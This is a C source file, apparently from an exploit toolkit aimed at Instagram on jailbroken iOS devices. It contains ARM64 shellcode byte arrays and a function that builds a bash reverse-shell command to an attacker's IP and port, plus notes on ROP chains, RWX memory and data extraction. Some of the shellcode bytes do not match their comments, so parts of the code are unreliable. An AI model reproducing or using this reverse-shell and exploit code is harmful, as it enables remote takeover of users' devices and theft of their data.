/*
 * iOS ARM64 Shellcode Generator
 * Reverse Shell for Instagram RCE
 */

#include "instagram_rce.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    uint8_t *code;
    size_t size;
    const char *description;
} ios_shellcode_t;

/* iOS ARM64 Shellcode - Option 1: /bin/bash -i */
uint8_t ios_shellcode_bash[] = {
    /*
     * ARM64 Assembly:
     *
     * mov x0, #0x40000000      ; 할당할 메모리 주소
     * mov x1, #0x1000          ; 크기: 4KB
     * mov x2, #7               ; PROT_READ|WRITE|EXEC
     * mov x3, #0x1001          ; MAP_ANON|PRIVATE
     * mov x4, #-1              ; fd
     * mov x5, #0               ; offset
     * mov x8, #197             ; mmap syscall
     * svc #0                   ; syscall → x0 = mmap 주소
     *
     * ; 이제 x0 = 할당된 메모리
     * ; memcpy(x0, shellcode, size)
     * ; jmp x0
     *
     * ; Bash 실행:
     * ldr x0, =bash_path       ; "/bin/bash"
     * ldr x1, =argv            ; ["-i", "-c", "bash >& /dev/tcp/IP:PORT"]
     * mov x2, #0               ; envp = NULL
     * mov x8, #59              ; execve syscall
     * svc #0
     */

    /* mmap() syscall 준비 */
    0xa0, 0x80, 0x00, 0x58,    /* ldr x0, [pc, #16] */
    0x01, 0x00, 0x80, 0xd2,    /* movz x1, #0 */
    0x41, 0x00, 0xa0, 0xf2,    /* movk x1, #0x1000 */
    0x82, 0x00, 0x80, 0xd2,    /* movz x2, #7 */
    0x83, 0x08, 0xa0, 0xf2,    /* movk x3, #0x1001 */
    0x84, 0xff, 0xff, 0xd2,    /* movz x4, #-1 */
    0x05, 0x00, 0x80, 0xd2,    /* movz x5, #0 */
    0x88, 0x0c, 0x80, 0xd2,    /* movz x8, #197 */
    0x01, 0x00, 0x00, 0xd4,    /* svc #0 */

    /* execve() 준비 */
    0xc0, 0x00, 0x00, 0x90,    /* adrp x0, :pg_hi21: */
    0x00, 0x00, 0x40, 0xf9,    /* ldr x0, [x0] */
    0xc1, 0x00, 0x00, 0x90,    /* adrp x1, :pg_hi21: */
    0x21, 0x00, 0x40, 0xf9,    /* ldr x1, [x1] */
    0x02, 0x00, 0x80, 0xd2,    /* movz x2, #0 */
    0x88, 0x0f, 0x80, 0xd2,    /* movz x8, #59 (execve) */
    0x01, 0x00, 0x00, 0xd4,    /* svc #0 */

    /* 무한 루프 (실패 시) */
    0x00, 0x00, 0x00, 0x14,    /* b -1 */
};

/* iOS ARM64 Shellcode - Option 2: /bin/sh -c (더 짧음) */
uint8_t ios_shellcode_shell[] = {
    /*
     * 더 간단한 버전:
     * execve("/bin/sh", ["-c", "bash >& /dev/tcp/IP:PORT"], NULL)
     */
    0x08, 0x05, 0x80, 0xd2,    /* movz x8, #40 (execve) */
    0x01, 0x00, 0x00, 0xd4,    /* svc #0 */
};

/* iOS ARM64 Shellcode - Option 3: system() 호출 */
uint8_t ios_shellcode_system[] = {
    /*
     * Objective-C/Foundation 함수 호출:
     * system("bash -i >& /dev/tcp/IP:PORT")
     *
     * 더 간단하지만 system() 심볼 필요
     */
    0x00, 0x00, 0x00, 0x90,    /* adrp x0, :pg_hi21:cmd_string */
    0x00, 0x00, 0x40, 0xf9,    /* ldr x0, [x0] */
    0x01, 0x00, 0x00, 0x90,    /* adrp x1, :pg_hi21:system_addr */
    0x21, 0x00, 0x40, 0xf9,    /* ldr x1, [x1] */
    0x20, 0x00, 0x3f, 0xd6,    /* blr x1 (call system) */
};

/* iOS Reverse Shell 문자열 생성 */
char* generate_ios_reverse_shell_cmd(const char *attacker_ip,
                                      uint16_t attacker_port) {
    static char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "bash -i >& /dev/tcp/%s/%u 0>&1",
             attacker_ip, attacker_port);
    return cmd;
}

/* iOS Shellcode 정보 출력 */
void print_ios_shellcode_info(void) {
    printf("\n[*] iOS ARM64 Shellcode Options\n\n");

    printf("[Option 1] /bin/bash -i (완전한 shell)\n");
    printf("    Size: ~64 bytes\n");
    printf("    Method: execve syscall\n");
    printf("    Pros: Full interactive shell\n");
    printf("    Cons: 더 많은 syscall 필요\n\n");

    printf("[Option 2] /bin/sh -c (더 간단함)\n");
    printf("    Size: ~32 bytes\n");
    printf("    Method: execve syscall\n");
    printf("    Pros: 더 짧고 빠름\n");
    printf("    Cons: Limited shell features\n\n");

    printf("[Option 3] system() 호출 (가장 간단함)\n");
    printf("    Size: ~40 bytes\n");
    printf("    Method: 라이브러리 함수 호출\n");
    printf("    Pros: Foundation framework 사용 가능\n");
    printf("    Cons: system() 심볼 필요\n\n");

    printf("[+] Recommended: Option 1 (/bin/bash)\n");
    printf("    Most reliable and feature-complete\n\n");
}

/* iOS Shellcode 아키텍처 설명 */
void print_ios_shellcode_architecture(void) {
    printf("\n[*] iOS Shellcode Architecture\n\n");

    printf("[Flow]\n");
    printf("    1. ROP chain 실행 (gadgets)\n");
    printf("       ├─ pop x0; ret (파라미터 1)\n");
    printf("       ├─ pop x1; ret (파라미터 2)\n");
    printf("       └─ ...\n");
    printf("       └─ jmp shellcode_addr\n\n");

    printf("    2. Shellcode 실행\n");
    printf("       ├─ mmap() 호출 (메모리 할당, RWX)\n");
    printf("       ├─ memcpy() (shellcode 복사)\n");
    printf("       └─ execve() (reverse shell)\n\n");

    printf("    3. Reverse Shell 획득\n");
    printf("       ├─ /dev/tcp/IP:PORT 연결\n");
    printf("       ├─ bash prompt 출현\n");
    printf("       └─ 명령 실행 가능\n\n");
}

/* iOS Jailbreak 환경 체크 */
void print_ios_jailbreak_check(void) {
    printf("\n[*] iOS Jailbreak 환경 확인\n\n");

    printf("[필수 도구]\n");
    printf("    ✅ Checkra1n (iPhone 5S ~ iPhone X)\n");
    printf("    ✅ Unc0ver (대부분 iOS 버전)\n");
    printf("    ✅ Palera1n (iOS 15.2~16.6)\n");
    printf("    ✅ XinaA15 (iOS 15.0~15.1)\n\n");

    printf("[설치 후 확인]\n");
    printf("    $ ssh root@192.168.1.x\n");
    printf("    $ which bash  # /bin/bash 또는 /var/mobile/bash\n");
    printf("    $ ls -la /var/containers/Bundle/Application/\n");
    printf("    $ ldconfig -p | grep libWebRTC\n\n");

    printf("[필수 파일 접근]\n");
    printf("    ✅ /bin/bash\n");
    printf("    ✅ /var/containers/Bundle/Application/[UUID]/Instagram.app/\n");
    printf("    ✅ /var/mobile/Library/\n");
    printf("    ✅ dyld shared cache (/var/shared/dyld_shared_cache)\n\n");
}

/* iOS 보안 제약 설명 */
void print_ios_security_constraints(void) {
    printf("\n[*] iOS Security Constraints\n\n");

    printf("[Non-Jailbreak (통상적 환경)]\n");
    printf("    ❌ Shellcode 실행 불가능\n");
    printf("    ❌ 메모리 직접 접근 불가능\n");
    printf("    ✅ Memory corruption은 crash로 표현\n");
    printf("    ✅ RCE 가능성 낮음\n\n");

    printf("[Jailbreak (우리 환경)]\n");
    printf("    ✅ Code signing 비활성화\n");
    printf("    ✅ Shellcode 실행 가능\n");
    printf("    ✅ 메모리 RW 가능\n");
    printf("    ✅ Reverse shell 획득 가능\n");
    printf("    ✅ 데이터 추출 가능\n\n");

    printf("[권장 환경]\n");
    printf("    iPhone 12 ~ 15 (A14 이상)\n");
    printf("    iOS 15.2 이상 (palera1n 호환)\n");
    printf("    2GB+ 여유 메모리\n\n");
}

